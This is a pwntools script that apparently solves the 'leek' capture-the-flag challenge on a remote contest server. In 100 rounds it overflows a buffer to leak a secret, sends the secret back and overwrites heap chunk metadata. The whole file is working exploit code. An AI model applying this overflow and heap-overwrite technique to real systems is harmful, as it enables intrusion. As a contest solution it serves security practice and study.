from pwn import *

io = remote('challs.actf.co', 31310)
#io = process('./leek')
#gdb.attach(io, api=True)
payload = b'a'*31
print(io.recv())
for i in range(100):
    log.info(f'Round {i}:')
    #print(io.recv(timeout=1).decode())
    print("Sending Overflow!!")
    io.sendline(payload)
    print(io.recvuntil(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n', timeout=1).decode())
    secret = io.recvline(keepends=False)
    #print(secret)
    print(io.recv(timeout=1))
    print("Sending secret!!")
    io.send(secret)
    print(io.recv(timeout=1).decode())
    print("Overwriting Heap Info!!")
    io.sendline(b'abcd' + b'\0'*20 + p32(0x31) + b'\0'*4)
    print(io.recv(timeout=1).decode())
io.interactive()